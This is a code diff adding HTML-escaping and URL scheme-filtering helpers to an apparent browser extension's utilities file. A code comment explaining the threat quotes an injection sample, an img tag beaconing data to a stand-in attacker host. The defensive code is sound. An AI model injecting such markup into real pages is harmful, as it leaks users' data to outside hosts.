@@ -1,5 +1,28 @@
 // Utility functions can be added here
 
+// HTML-escape so text containing <, >, &, " or ' can't break markup or escape
+// an attribute boundary. Every visited page controls its own document.title,
+// img alt and URL, so any of those reaching an innerHTML/.html() sink on a
+// privileged extension page is attacker-controlled. The extension-pages CSP
+// (script-src 'self') blocks script execution, but unescaped markup can still
+// beacon out via <img src=//attacker/?leak> and spoof this trusted UI.
+export function escapeHtml(unsafe) {
+  if (unsafe === null || unsafe === undefined) return "";
+  return String(unsafe)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+// URLs additionally reach href/src attributes, where escaping alone still
+// permits javascript: and data: scheme execution on click.
+export function safeUrl(url) {
+  const s = String(url ?? "").trim();
+  return /^(https?:|ftp:|mailto:|chrome:|chrome-extension:)/i.test(s) ? s : "#";
+}
+
 export function abbreviateTitle(title, maxLength) {
   if (title.length > maxLength) {
     return title.substring(0, maxLength) + "...";
